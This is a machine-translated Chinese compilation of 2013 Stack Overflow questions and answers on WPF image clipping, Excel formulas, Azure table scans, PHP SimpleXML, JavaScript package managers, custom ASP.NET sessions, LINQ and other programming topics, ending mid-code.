> 赞同：4
> 
> 时间：2013-02-26T15:01:18.057
> 
> 标签：wpf, clipping

我正在编写一个 WPF 应用程序，它显示最初居中的图像。用户可以放大/缩小和移动图像，使用`ScaleTransform`和实现`TranslateTransform`。这很好用。

问题是当图像明显大于窗口时，用户移动图像或缩小到足以使整个图像可见。最初隐藏的图像部分不会被渲染，而是仅绘制图像的原始可见部分。

基于[其他一些](https://stackoverflow.com/questions/3686170/wpf-image-control-clipping) [问题](https://stackoverflow.com/questions/6010187/wpf-image-stretch-to-fill-doesnt-stretch-to-the-bounds-of-its-parents)，如果我将图像放在 a`Canvas`中，这将导致整个图像被渲染，并且在移动时它将被正确渲染。问题是我不希望我的图像位于 a 中`Canvas`，因为这会阻止任何其他布局发生 -`HorizontalAlignment`和`VerticalAlignment`属性被忽略（因此图像不再居中），我需要实现一个选项来绘制尽可能大的图像以填充不再起作用的窗口的整个区域（将`Stretch`属性设置为`UniformToFill`不执行任何操作）。

目前，这两个转换都设置为`RenderTransform`属性。如果我`LayoutTransform`改为使用，则会绘制整个图像，但这也会阻止用户将图像的任何部分移出窗口边缘（这是我想要保留的行为）。

如何告诉 WPF 在不使用 a`Canvas`或 a 的情况下始终渲染整个图像`LayoutTransform`？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T16:11:22.437

我建议不要使用 TranslateTransform，而是使用 ScrollViewer。

```
<ScrollViewer>
   <Grid>
      <Image Source="blabla">
          <Image.LayoutTransform>
              <ScaleTransform />
          </Image.LayoutTransform>
      </Image>
   </Grid>
</ScrollViewer> 
```

ScrollViewer 给了 Image 无限的扩展空间，整个图片都会被渲染出来。Grid 强制居中布局，同时仍允许图像扩展。如果您不喜欢滚动条来控制翻译，那么您可以隐藏它们并推出您自己的解决方案。

LayoutTransform 绝对是要走的路，以便图像的实际像素大小（基于缩放）正确反映到您的窗口上。

# android - Monodroid：访问 View-Class 的 setLayerType

> ID：15092325
> 
> 赞同：1
> 
> 时间：2013-02-26T15:01:24.083
> 
> 标签：android, view, mono, xamarin.android

我想在 Mono for Android 应用程序中调用 View 类的方法 setLayerType。不幸的是，我无法访问（甚至看到）该方法。根据[Mono 文档](http://docs.go-mono.com/index.aspx?link=M%3aAndroid.Views.View.SetLayerType%28Android.Views.LayerType,Android.Graphics.Paint%29 "单声道文档")，一切都应该在那里。

有人可以帮我吗？

谢谢，

法科

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-18T19:22:20.710

我有同样的问题。您可以在项目设置下修复此问题，选择 Android 3.1 或更高版本的“目标最低框架版本”。这与清单中的最低/目标 API 级别无关。

更改后，您将不得不重新启动 Visual Studio（或重新加载相关项目），您会注意到它现在引用了 Mono 的 v3.1 程序集，其中公开了一些新的 API。

您仍然希望围绕版本检查包装对该 API 的调用，例如：

if (Build.VERSION.SdkInt >= BuildVersionCodes.Honeycomb) 如果您的 minApiLevel 小于 11。

# iphone - 如何通过制作 mtree 来修复错误

> ID：15092326
> 
> 赞同：0
> 
> 时间：2013-02-26T15:01:27.483
> 
> 标签：iphone, terminal, makefile, configure

您好，我是新手，我不明白，这是怎么回事。我的 iPhone 需要[mtree](http://code.google.com/p/mtree-port/)，但出现错误。这就是我得到的：

```
In file included from compare.c:62:
vis.h:43: error: expected ‘=’, ‘,’, ‘;’, ‘asm’ or ‘__attribute__’ before ‘size_t’
In file included from compare.c:65:
extern.h:52: warning: redundant redeclaration of ‘compare’
extern.h:40: warning: previous declaration of ‘compare’ was here
extern.h:59: warning: redundant redeclaration of ‘getmode’
/usr/include/unistd.h:700: warning: previous declaration of ‘getmode’ was here
extern.h:60: warning: redundant redeclaration of ‘setmode’
/usr/include/unistd.h:736: warning: previous declaration of ‘setmode’ was here
compare.c: In function ‘compare’:
compare.c:186: error: ‘struct stat’ has no member named ‘st_mtim’
compare.c:187: error: ‘struct stat’ has no member named ‘st_mtim’
compare.c:192: error: ‘struct stat’ has no member named ‘st_mtim’
make[1]: *** [compare.o] Error 1
make: *** [all] Error 2 
```

完整信息在[http://pastebin.com/rVUfVP75](http://pastebin.com/rVUfVP75)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:14:33.017

```
compare.c:186: error: ‘struct stat’ has no member named ‘st_mtim’ 
```

它应该是 st_mtime。它看起来像一个错字。

结构定义在这里： http: [//pubs.opengroup.org/onlinepubs/007908799/xsh/sysstat.h.html](http://pubs.opengroup.org/onlinepubs/007908799/xsh/sysstat.h.html)

# excel - Excel公式用于查找列中最早到最早的日期

> ID：15092328
> 
> 赞同：0
> 
> 时间：2013-02-26T15:01:31.713
> 
> 标签：excel, excel-formula, array-formulas

我在 Excel 中有一个数据查询，它为单个员工返回多行信息。员工按 EmployeeID 排序，数据包含工资率和日期。

我已按日期降序对信息进行排序，以便为我提供员工的第一个工资率，以便将其放入工作簿中另一张工作表的 VLookUp 中。现在我需要一个公式来给我下一个日期，这样我就可以找到该范围内第二个最早的日期。这可以做到吗？

```
Data example:
1255  7.50   06/11/2012
1255  7.00   09/11/2011
1255  6.50   05/12/2011
2548  12.50  03/02/2012
2548  12.00  01/13/2012 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:07:24.267

而不是`VLOOKUP`使用`INDEX/MATCH`！

假设您当前的公式是：

```
=VLOOKUP(A1,Sheet1!A:C,3,0)

```

这可以转换为

```
=INDEX(Sheet1!C:C,MATCH(A1,Sheet1!A:A,0))

```

它做同样的事情（在 A 中搜索匹配并从 C 列返回结果）。现在您可以轻松获得下一场比赛：

```
=INDEX(Sheet1!C:C,MATCH(A1,Sheet1!A:A,0)+1)

```

如果您想测试它是否仍然是同一员工（在 B 列中），则公式要复杂一些：

```
=IF(INDEX(Sheet1!B:B,MATCH(A1,Sheet1!A:A,0))=INDEX(Sheet1!B:B,MATCH(A1,Sheet1!A:A,0)+1),INDEX (Sheet1!B:B,MATCH(A1,Sheet1!A:A,0)+1),"只有一个条目！")

```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:31:14.583

你要日期还是工资率？如果是日期，那么如果您在 E2 中有员工 ID，在 F2 中有该员工的第一个日期（由 VLOOKUP 提取），那么这个公式将给出第二个日期

`=VLOOKUP(E2,IF(Sheet1!C$2:C$100>F2,Sheet1!A$2:C$100),3,0)`

确认`CTRL+SHIFT+ENTER`

您可以以相同的方式获得下一个日期 - 如果该员工没有另一个日期，您将获得 #N/A

# azure - Azure 表存储并行查询

> ID：15092329
> 
> 赞同：1
> 
> 时间：2013-02-26T15:01:32.657
> 
> 标签：azure, azure-storage, azure-table-storage

如果我没有指定分区键并因此对所有分区执行扫描，扫描是否会自动与同时扫描的每个分区并行进行？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T15:15:13.423

由于实体按 PartitionKey/RowKey 组合存储，因此从第一个 Partition 开始按顺序进行扫描。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T17:40:32.953

Gaurav Mantri 是正确的。

如果您想强制它并行完成，则必须按所有可能的 PartitionKeys 进行过滤，然后自己在代码中并行执行这些查询。这可能会也可能不会“更好”（更快/更容易/更便宜），因为它取决于很多不同的事情。

最终，对于典型情况，我不建议这样做。以不同的方式组织数据可能会更好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T01:23:42.323

正如 Gaurav 所说，这不是自动的。但这并不意味着它不能完成。

如果可以对 PartitionKey 做出某些假设，则可以非常轻松地并行执行 Azure Tables。例如，如果您的 PartitionKey 是一个 GUID，您可以启动 10 个线程，例如通过在范围内搜索您的数据。这是您将在第一个线程上使用的范围示例，检索范围 [a, e[ 中的所有实体。请注意，您可以根据需要对其进行调整，并根据需要运行 20 个线程。

（PartitionKey ge 'a' 和 PartitionKey lt 'e'）

如果您使用非唯一值而不是 GUID，比方说国家列表，您只需启动与国家数量一样多的线程。

您真正需要扫描整个 Azure 表的唯一情况是所有实体的 PartitionKey 相同，在这种情况下，您可能面临设计问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-02T11:25:54.473

几个月后，我想发布一个答案来讨论并行全表扫描对性能的影响。

我使用了一个 128 分区方案，该方案使用了一个密钥生成算法，该算法在给定 Guid 行密钥种子值的情况下具有出色的分布。

实证测试表明，单线程查询在某些情况下可以执行得非常好。表的大小以及我认为 Azure 如何分配这些部分似乎有所不同。

简而言之，这是一个需要在产品生命周期内检查的领域，以了解不同的策略是否会提高性能。

因此，我所做的是在针对表格的自动化测试中设置了预期的持续时间，以便任何降级都可以闪烁红灯以再次检查。

# rest - New Relic - 如何在单个 REST API 查询中获取多个字段值

> ID：15092333
> 
> 赞同：0
> 
> 时间：2013-02-26T15:01:47.223
> 
> 标签：rest, monitoring, newrelic

所以我正在尝试使用 New Relic 的 REST API 来获取有关我的服务器的一些测量值。

我能够使用以下方法获取单个字段的值：

```
curl -gH "x-api-key:<my key>" 'https://api.newrelic.com/api/v1/accounts/<my key>/agents/<my key>/data.json?begin=<begin>&end=<end>&metrics[]=Database/all&field=call_count' 
```

或者

```
curl -gH "x-api-key:<my key>" 'https://api.newrelic.com/api/v1/accounts/<my key>/agents/<my key>/data.json?begin=<begin>&end=<end>&metrics[]=Database/all&field=calls_per_minute' 
```

但我无法将这两个查询组合为：

```
curl -gH "x-api-key:<my key>" 'https://api.newrelic.com/api/v1/accounts/<my key>/agents/<my key>/data.json?begin=<begin>&end=<end>&metrics[]=Database/all&field=call_count&field=calls_per_minute' 
```

因为它总是只返回第二个字段的结果。

有没有办法在一次调用中执行这两个查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-30T15:52:06.120

不幸的是，目前没有办法做到这一点（New Relic 致力于尽快改进我们的 REST API）。一些像 threshold_values 这样的调用会返回一个不同字段的数组，但是对于像你描述的那样的调用，你需要发出两个请求。

# javascript - jquery日期格式，每个浏览器都不同？

> ID：15092336
> 
> 赞同：3
> 
> 时间：2013-02-26T15:01:55.923
> 
> 标签：javascript, datetime, formatting

我正在使用自 UTC 纪元以来的秒数计算日期。

这是我目前的做法：

```
var LastUpdatedTime = data.LastUpdated;
myDate = new Date(1000 * LastUpdatedTime);                                  
var LastUpdatedTime = myDate.toLocaleString(); 
```

在 Chrome 中我看到：2/26/2013 9:57:35 AM

这正是我想要的

在 Safari 中我看到：美国东部标准时间 2013 年 2 月 26 日上午 9:27:34

关于如何让 Safari 像 Chrome 一样格式化日期的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:42:16.723

浏览器可以自由地以他们喜欢的任何格式实现 Date 的字符串输出函数。要在浏览器中实现一致的格式，您必须创建自己的格式化函数或使用第三方库，例如[Datejs](http://www.datejs.com/)或[date.format.js](http://blog.stevenlevithan.com/archives/date-time-format)。

顺便说一句，这与 jQuery 无关。问题是 ECMAScript 没有定义一致的日期格式化机制。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:28:14.503

你可以试试[Datejs](http://www.datejs.com/)

它为您提供了以您想要的方式很好地格式化日期的方法，例如

```
 new Date().toString('dd/mm/yyyy hh:MM:ss') 
```

# javascript - Rangy：为同一段文本添加多个高光

> ID：15092337
> 
> 赞同：3
> 
> 时间：2013-02-26T15:01:59.190
> 
> 标签：javascript, rangy

我正在使用 Rangy 进行一些文本突出显示。用户选择一些文本，单击一个按钮，然后使用 Rangy 荧光笔模块突出显示文本。我还允许用户搜索文本，使用相同的荧光笔模块再次突出显示搜索结果。但是，对于搜索结果，我使用不同的类。

我遇到的问题是当我搜索包含在突出显示中的一段文本时。Rangy 对我来说太聪明了，并且正在将我想要成为具有不同类的两个跨度合并为具有多个类的单个跨度。虽然看起来不错，但问题来自“清除”搜索结果。这目前也删除了重叠的高光。

在生成的 HTML 方面，我目前有这样的东西：

```
<span class="highlight search">some text</span><span class="highlight"> and some more</span> 
```

但我想要的是跨度结果中的跨度，如下所示：

```
<span class="highlight"><span class="search">some text</span> and some more</span> 
```

在创建荧光笔或 css 应用程序时我可以使用一些设置来给我这个结果吗？

# php - php simpleXMLElement 到数组：空值

> ID：15092338
> 
> 赞同：10
> 
> 时间：2013-02-26T15:01:59.450
> 
> 标签：php, xml, associative-array

我有以下 XML：

```
<account>
    <id>123</id>
    <email></email>
    <status>ACTIVE</status>
</account> 
```

我想把它作为一个数组变量。因此我用`$xml = simplexml_load_file()`. 将 simpleXMLElement 转换为我知道的关联数组的最简单方法是使用以下方法对其进行研磨：`json_decode(json_encode((array) $xml),1);`

问题是我不想将`email`键作为一个空数组，而是作为一个`NULL`值。作为 SimpleXMLElement，它看起来像：

```
public 'email' => 
    object(SimpleXMLElement)[205] 
```

而在数组中它看起来像：

```
'email' => 
    array (size=0)
      empty 
```

我想得到：

```
'email' => NULL 
```

我想到的实现这一点的唯一方法是遍历所有元素并用空值替换空数组。问题是我的 XML 更大（以上只是为了解释问题）并且我必须迭代很多 XML 元素（这将是手动工作 - 我正在寻找自动的东西）。也许我在其中一个功能中遗漏了一些选项......或者也许还有另一个技巧可以做到这一点？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-27T09:27:14.400

我无法添加评论，但我认为这对你有用，它应该比正则表达式或循环更快：

```
//after you json_encode, before you decode
$str = str_replace(':[]',':null',json_encode($array)); 
```

JSON 中的空数组由“ `[]`”表示。有时数组被解析为对象，在这种情况下（或作为后备）您也可以替换“ `:{}`”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-07-13T14:13:01.613

一个空[`SimpleXMLElement object`](http://php.net/manual/en/class.simplexmlelement.php) 将被转换为一个空数组。您可以通过从 SimpleXMLElement 扩展并实现[`JsonSerializable interface`](http://php.net/class.jsonserializable)并将它强制转换为**null**来更改此设置。

```
/**
 * Class JsonXMLElement
 */
class JsonXMLElement extends SimpleXMLElement implements JsonSerializable
{

    /**
     * Specify data which should be serialized to JSON
     *
     * @return mixed data which can be serialized by json_encode.
     */
    public function jsonSerialize()
    {
        $array = array();

        // json encode attributes if any.
        if ($attributes = $this->attributes()) {
            $array['@attributes'] = iterator_to_array($attributes);
        }

        // json encode child elements if any. group on duplicate names as an array.
        foreach ($this as $name => $element) {
            if (isset($array[$name])) {
                if (!is_array($array[$name])) {
                    $array[$name] = [$array[$name]];
                }
                $array[$name][] = $element;
            } else {
                $array[$name] = $element;
            }
        }

        // json encode non-whitespace element simplexml text values.
        $text = trim($this);
        if (strlen($text)) {
            if ($array) {
                $array['@text'] = $text;
            } else {
                $array = $text;
            }
        }

        // return empty elements as NULL (self-closing or empty tags)
        if (!$array) {
            $array = NULL;
        }

        return $array;
    }
} 
```

然后告诉`simplexml_load_string`返回一个`JsonXMLElement`类的对象

```
$xml = <<<XML
<account>
   <id>123</id>
   <email></email>
   <status>ACTIVE</status>
</account>
XML;

$obj = simplexml_load_string($xml, 'JsonXMLElement');

// print_r($obj);

print json_encode($obj, true);

/*
 * Output...
{
   "id": 123,
   "email": null,
   "status": "ACTIVE"
}
*/ 
```

信用：[哈克雷](https://hakre.wordpress.com/2013/07/09/simplexml-and-json-encode-in-php-part-i/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-10-27T10:12:35.910

**检查性能 str_replace 与递归循环**

*   *迭代次数*：100000
*   *XML 长度*：4114 字节
*   *初始化脚本时间*：~1.2264486691986E-6 秒
*   *JSON 编码/解码时间*：~9.8956169957496E-5 秒
*   **str_replace**平均时间：**0.00010692856433176**秒
*   **递归循环**平均时间：**0.00011844366600813**秒

str_replace 在 ~0.00001 秒内快速。在许多电话中，差异会很明显

# javascript - JavaScript 依赖管理：npm vs. bower vs.volo

> ID：15092345
> 
> 赞同：162
> 
> 时间：2013-02-26T15:02:26.157
> 
> 标签：javascript, node.js, npm, bower, volojs

你如何比较`npm`，`bower`和`volo`？

这三个都可用于为 UI 项目安装 JavaScript 依赖项。我了解`npm`更多是特定于节点的。

那么，什么时候用什么？

`npm`仍然遥遥无期，但`bower`似乎`volo`正在解决完全相同的问题，尽管我无法在`npm`和之间划清界限`bower-volo`。

* * *

## 回答 #1

> 赞同：106
> 
> 时间：2013-04-15T22:45:13.297

最能描述 npm 和 bower 之间区别的描述是：npm 管理称为包的 JavaScript 模块，而 Bower 管理称为组件的前端组件（即 css、html 和 JavaScript）。npm 也用于安装 bower。这是[一篇关于 npm 和 bower 的扩展文章](http://codylindley.com/techpro/2013_04_12__package-managers-an-introducto/)（不包括 volo），其中包含大量细节。

* * *

## 回答 #2

> 赞同：74
> 
> 时间：2013-02-26T17:33:03.673

# 凉亭

它在前端开发人员中仍然很受欢迎，尽管它的功能很少。每个前端包都在使用它。还有一个[将 bower 合并到 npm 的倡议](https://github.com/bower/bower/issues/1520)。

Bower 针对客户端进行了优化，仅支持平面依赖树，即[每个库只能使用一次](https://stackoverflow.com/a/18652918/1269037)（因为将同一库的不同版本发送到客户端很昂贵），并且依赖约束必须由用户解决.

您可以期望在 bower 注册表 ( ) 中找到任何与前端相关的东西`bower search <some keyword>`——在我看来，这是 bower 相对于其他包管理器的最大优势。

# 沃洛

多年来，我仍然没有使用超过 5 分钟。不知道，[但据我](https://github.com/volojs/volo/wiki/Creating-a-volofile)所知，它确实包含一些构建工具，这是 Grunt 用户非常熟悉的。

# npm

是的，npm 代表节点包管理器。但是现在你可以用它来做任何事情。人们不再只`npm install`ing 事物并期望它们*仅*在 Node 环境中工作。例如，有许多[用于 Twitter Bootstrap 的 npm 包](https://www.npmjs.com/search?q=bootstrap)。

Npm 针对服务器端使用进行了优化，具有嵌套的依赖树。每个依赖项都可以有自己的依赖项，这些依赖项可以有自己的依赖项，依此类推。这消除了依赖版本冲突，因为每个依赖都可以使用它们自己的版本，例如下划线。然而，即将到来的[npm 版本 3 将扁平化依赖树](http://blog.npmjs.org/post/110924823920/npm-weekly-5)：

> 使用 npm@3，你的 node_modules 目录会更平坦。您的所有依赖项和大多数子依赖项（和（子）+依赖项）将在顶层彼此相邻。只有当存在冲突时，才会安装更深层次的模块。这应该使 Windows 用户的事情变得更容易。

我在使用 npm 时看到的一些优点：

*   它被所有其他包管理器（组件、bower、volo、JSPM 等）使用；
*   允许使用构建脚本；
*   许多工具可用于自省基于 npm 的包

npm 是 JavaScript 的包管理器。

![npmjs.com 截图](../Images/ee5bab6d43ff51444a3564b4372e6905.png)

* * *

截至 2013 年 2 月，我的意见如下。**请不要再考虑它了。**

# npm

当您使用 Node 项目时，最好坚持使用它，浏览器可用的项目也很少......

# 凉亭

鲍尔是现在的流行音乐人。他们有很多项目，项目维护者喜欢让他们在凉亭注册表中保持最新......

很遗憾他有时有点毛病。

# 沃洛

从那以后，我已经有超过 5 分钟没有尝试过 Volo，但据我所知，它看起来比 Bower 更灵活。

对volo 不利的一点是，他们的项目非常过时。

* * *

## 回答 #3

> 赞同：24
> 
> 时间：2013-11-25T10:02:56.080

他们似乎正在解决相同的问题，但针对不同的环境/世界。用于 nodejs 和 Volo 的 NPM，用于浏览器的 bower。

事实上，你也可以使用 NPM 来管理浏览器的 javascript 和 css。没有什么能阻止你这样做。从这个意义上说，使用 NPM 对我来说比为同一目的管理两个不同的工具更自然。

似乎凉亭有更多可用的软件包，至少对于更受欢迎的软件包。但很快[jQuery 也将直接在 NPM 中可用，](http://bugs.jquery.com/ticket/13119)并且可能所有其他库都将遵循相同的趋势。

在我看来，由于那里有诸如**[browserify](http://browserify.org/)**和**[webmake](https://github.com/medikoo/modules-webmake)**之类的工具，可以帮助在浏览器中使用节点模块，因此不再需要**bower**或**volo**，除非它们为您提供其他东西（特定模块仅存在于他们的注册表）。

**Volo**和**Bower**也都不错，但从我的角度来看，如果你已经在使用 NPM，那么坚持下去可能会更好。

请注意，**即使不使用 browserify 或 webmake，您也可以使用 NPM 来管理您的客户端依赖项**。在我从事的大多数项目中，安装 npm 模块后，我运行一个脚本将它们部署到我的客户端应用程序使用它们的位置。有时我使用 grunt 将该文件与其他 js 文件连接起来，有时我直接从我的 Web 应用程序的模板文件中引用它。无论如何，这是个人喜好。其他人会发现 Bower 或 Volo 更易于使用，因为它们更自然地融入他们的工作流程。

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2014-02-28T16:54:12.803

Bower 相对于 NPM 的最大优势在于它的依赖管理强制使用单个版本的组件（而 NPM 通过将不同的副本/版本作为不同模块的子依赖项来工作）。这是**一件非常好的**事情，因为它可以防止您的客户端 javascript 通过需要包含不同版本的组件的多个副本而变得臃肿。包含一个模块的多个副本是 NPM 依赖管理工作方式的核心，因此 NPM 完全不适合客户端包管理。

上述结果是 bower 包维护者和消费者必须更加注意维护他们的依赖版本号以避免冲突，但这是值得付出的代价。而且我发现 NPM 模块在发布主要、次要和补丁版本时经常马虎，所以 NPM 依赖管理也不是完美的。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2014-02-10T05:59:45.043

我知道这不在问题的范围内，但还有另一种选择。Jam JS - [http://jamjs.org/](http://jamjs.org/)有趣的一件事是它在 jam 中具有 grunt 功能：

```
jam compile output.js 
```

有人应该制作另一个包管理器并将其命名为：yapm :)

# c# - MVC / ASP.NET 中的自定义会话处理

> ID：15092348
> 
> 赞同：4
> 
> 时间：2013-02-26T15:02:29.300
> 
> 标签：c#, asp.net-mvc, security

我正在使用 ASP.NET，我使用自己编写的自定义身份验证提供程序，散列和加盐已到位，因此它应该相对安全。

我还实现了一个像这样工作的自定义身份验证会话机制。

1.  用户登录到 Web 应用程序，根据 mssql db 中的数据验证密码。
2.  将新行插入到“会话”表中，其中包含对登录用户的引用、身份验证令牌和到期日期。
3.  身份验证令牌与 cookie 一起返回，并存储在客户端的计算机上。
4.  身份验证令牌用于识别用户。

它工作得很好，但我不确定这是正确的方法，因为我可以看到潜在的安全风险，例如，如果有人侵入数据库并更改用户 ID，或者获取身份验证令牌，或者我错了吗？

PS 不幸的是，我不能使用内置的身份验证/会话处理，因为我们的客户要求这样做，而且我们必须支持其他数据库引擎，例如 mysql、oracle/etc，所以请不要建议 :)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:49:33.180

我认为这*几乎*是安全的。

为了减轻您在查看数据库时对所有内容都受到损害的担忧，有一些方法可以解决这个问题。如果您不担心扩展到多台服务器，您可以在应用程序启动时生成一个密钥。然后使用此密钥对每个会话进行“签名”。因此，您可以对类似的东西进行哈希处理`auth token+server key+expiration`，然后您可以在会话的每个请求上验证这一点。

至于能够窃取身份验证令牌的人，您在这里只有这么多选择。作为参考，这被称为“重放攻击”。它们很难在不使您的网站烦人的情况下阻止它们（哦，您想从这一页打开 3 个选项卡，您将不得不登录，因为它是重播）有关更多信息，请参见[维基百科](http://en.wikipedia.org/wiki/Replay_attack)。这在很大程度上取决于您需要的“安全程度”。

# c++ - typedef Char* 没有命名类型

> ID：15092352
> 
> 赞同：1
> 
> 时间：2013-02-26T15:02:38.240
> 
> 标签：c++, pointers, typedef

作为 C++ 的初学者，我面临着某种问题。我想用指针指定我自己的类型。但是我的代码无法编译。这是我想要做的一瞥：

```
namespace mynamespace
{
    typedef os_uchar Boolean;
    typedef Boolean& Boolean_out;
    typedef Boolean* Boolean_ptr;

    [...]
} 
```

我收到了这些 lignes 的错误：

```
'os_uchar' does not name a type
'Boolean' does not name a type
'Boolean' does not name a type 
```

如何将 Boolean* 和 Boolean& 指定为定义的类型？是否可以 ？

我会很感激你的回答:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:04:04.310

你所有的错误都来自第一个 - `'os_uchar' does not name a type`. 只需包含定义类型的标题，`os_uchar`它应该可以工作。

# r - 仅栅格化 SpatialPolygonsDataFrame 的边缘

> ID：15092358
> 
> 赞同：0
> 
> 时间：2013-02-26T15:02:50.480
> 
> 标签：r, shapefile, edges, rasterize

我已经使用 readOGR（来自包'rgdal'）导入了一个 shapefile，并获得了一个 SpatialPolygonsDataFrame。当我使用'rasterize'功能（包'raster'）我得到这个

[http://img15.hostingpics.net/pics/427269plot.png](http://img15.hostingpics.net/pics/427269plot.png)

但我只想光栅化边缘，所以我可以获得一个看起来像这样的 GeoTiff

[http://img15.hostingpics.net/pics/270288Rplot.png](http://img15.hostingpics.net/pics/270288Rplot.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T12:26:17.640

您可以使用`raster`和`sp`，使用`SpatialLines`对象类型来做到这一点。试试这个例子并`spdf`用您导入的 shapefile 名称替换：

```
spdf <- readShapePoly(system.file("shapes/sids.shp", package="maptools")[1]) # Read in your datafile. You can use readOGR or readShapePoly, it doesn't really matter.
sldf <- as( spdf , "SpatialLinesDataFrame") # Create a lines object. This gives you the borders of the polygons
r <- raster( nrow = 180 , ncols = 360 , ext = extent(spdf) ) # Create a template raster file which will form the mask you will rasterzie to (so if you want a more precise 
r <- rasterize( sldf , r ) # Depending on the resolution of your target raster and the complexity of your shapefile this may take a few seconds or a few minutes to run 
```

您可以根据需要保存光栅文件。

```
plot( spdf )
plot( r ) 
```

![在此处输入图像描述](../Images/4e0027c37217a0819da23289b3182366.png) ![在此处输入图像描述](../Images/24c582abab51feb88f4da81afdc83287.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T21:04:22.617

一般来说，要获得绘制在以下位置的多边形数据`ggplot2`：

```
library(ggplot2)
# Convert the SpatialPolygons object to a data.frame, which ggplot2 needs
poly_data_frame = fortify(poly_spatialpolygon)
ggplot(poly_data_frame, aes(x = x, y = y)) + geom_polygon(fill = "transparent")
ggsave("poly_plot.png") 
```

现在您最终会在 PNG 文件中得到一个多边形图，多边形内没有任何颜色。

# jboss - 服务器 JBOSS 会话过期时更新数据库

> ID：15092366
> 
> 赞同：0
> 
> 时间：2013-02-26T15:03:05.023
> 
> 标签：jboss, richfaces, seam

我正在使用 Java、hibernate、SEAM 和 Richfaces。

我在数据库中保存了一个指示用户登录的寄存器，现在我需要在服务器会话到期时保存在数据库中。我实现了一个实现 HttpSessionListener 的类。我将方法 sessionDestroyed 放入如下：

```
 ...
            historia.setFechafinal(new Date());
    historia.setGlosa("test");
    historia.setTiempo("tiempo");
    entityManager.persist(historia);   
            ... 
```

当我想保留对象历史时，会抛出一个错误。这应该是因为组件 entityManager 只是不存在，因为会话已过期。

会话过期后如何写入数据库？我是这门学科的菜鸟。

谢谢你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T20:09:47.317

您可以尝试使用 Seam 的 Run As 功能。我们将它用于在没有登录用户时在后台运行的一些计划进程。

[http://docs.jboss.org/seam/2.2.2.Final/reference/en-US/html/security.html#d0e13810](http://docs.jboss.org/seam/2.2.2.Final/reference/en-US/html/security.html#d0e13810)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-14T18:44:40.987

您可以为此使用观察者，只要 http 会话被销毁，该方法就会被触发

```
@In User user; //User stored in session scope

@Observer("org.jboss.seam.preDestroyContext.SESSION")
public void userSessionDestroy(){

    //do something with User here

} 
```

# c# - 如何使用 LINQ 和 C# 找到最接近 0,0 点的点

> ID：15092371
> 
> 赞同：9
> 
> 时间：2013-02-26T15:03:11.533
> 
> 标签：c#, linq, point

我有一个点列表（列表）

*   7,43
*   7,42
*   6,42
*   5,42
*   6,43
*   5,43

我想使用 linq 表达式来获得最接近 0,0 的点。例如 - 对于这个列表，我期望 5,42 的值。

如何使用 LINQ 找到最接近 0,0 点的点？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-26T15:07:55.930

下面找到具有最低`L^2`范数的点（二维中“距离”的最常见定义），而无需对整个列表执行昂贵的排序：

```
var closestToOrigin = points
    .Select(p => new { Point = p, Distance2 = p.X * p.X + p.Y * p.Y })
    .Aggregate((p1, p2) => p1.Distance2 < p2.Distance2 ? p1 : p2)
    .Point; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-02-26T15:06:26.133

试试这个：

```
List<Point> points = new List<Point>();
// populate list
var p = points.OrderBy(p => p.X * p.X + p.Y * p.Y).First(); 
```

或更快速的解决方案：

```
var p = points.Aggregate(
            (minPoint, next) =>
                 (minPoint.X * minPoint.X + minPoint.Y * minPoint.Y)
                 < (next.X * next.X + next.Y * next.Y) ? minPoint : next); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-26T15:07:02.780

Rawling 的解决方案肯定更短，但这里有一个替代方案

```
// project every element to get a map between it and the square of the distance
var map = pointsList                                            
    .Select(p => new { Point = p, Distance = p.x * p.x + p.y * p.y });

var closestPoint = map // get the list of points with the min distance
    .Where(m => m.Distance == map.Min(t => t.Distance)) 
    .First() // get the first item in that list (guaranteed to exist)
    .Point; // take the point 
```

如果您需要找到与 的距离最短的**所有**`0,0`元素，只需删除`First`并执行 a`Select(p => p.Point)`即可获取点（与映射相反）。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-02-26T15:21:03.423

作为一种替代方法，您可以考虑向标准库中添加 IEnumerable.MinBy() 和 IEnumerable.MaxBy() 的实现。

如果你有可用的，代码就变得简单了：

```
var result = points.MinBy( p => p.X*p.X + p.Y*p.Y ); 
```

Jon Skeet 提供了一个很好的 MinBy 和 MaxBy 实现。

他在这里谈论它：[How to use LINQ to select object with minimum or maximum property value](https://stackoverflow.com/questions/914109/how-to-use-linq-to-select-object-with-minimum-or-maximum-property-value)

不过，那里的链接已经过时了；最新版本在这里：

[http://code.google.com/p/morelinq/source/browse/MoreLinq/MinBy.cs](http://code.google.com/p/morelinq/source/browse/MoreLinq/MinBy.cs)

[http://code.google.com/p/morelinq/source/browse/MoreLinq/MaxBy.cs](http://code.google.com/p/morelinq/source/browse/MoreLinq/MaxBy.cs)

这是一个完整的样本。显然，这是一个大锤，但我认为这些方法足够有用，可以包含在您的标准库中：

```
using System;
using System.Collections.Generic;
using System.Drawing;

namespace Demo
{
    public static class EnumerableExt
    {
